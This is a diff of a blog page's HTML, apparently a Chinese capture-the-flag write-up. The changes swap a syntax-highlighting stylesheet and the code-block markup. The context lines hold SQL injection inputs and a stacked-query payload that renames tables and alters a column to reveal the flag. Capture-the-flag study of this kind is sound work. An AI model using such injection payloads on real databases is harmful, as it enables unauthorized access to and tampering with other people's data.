@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -248,7 +256,7 @@
 <p>在windows系统下，反单引号是数据库、表、索引、列和别名用的引用符。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/8e40ff5403047887.png" srcset="/img/loading.gif"><br>另一个表：<code>1&#39;;desc words;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/3fbb9965de0a3b46.png" srcset="/img/loading.gif"><br>这个表中有<strong>id</strong>和<strong>data</strong>;所以猜测后台的查询语句可能是：<code>select id,data from words where id =</code></p>
 <p>然后这个改名的方法tql：</p>
 <p>将<code>1919810931114514</code>改为words；原来的words改成其他名字words1；列名flag改成id，然后用<code>1&#39; or 1=1;</code>就能得到flag了。<br><strong>payload：</strong></p>
-<div class="hljs"><pre><code>0&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</code></pre></div>
+<pre><code>0&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</code></pre>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/01/7bfbf349a5b321ec.png" srcset="/img/loading.gif"></p>
 <ul>
 <li>知识点        <blockquote>
@@ -400,6 +408,8 @@
 
 
 
+  
+    
   
 
 
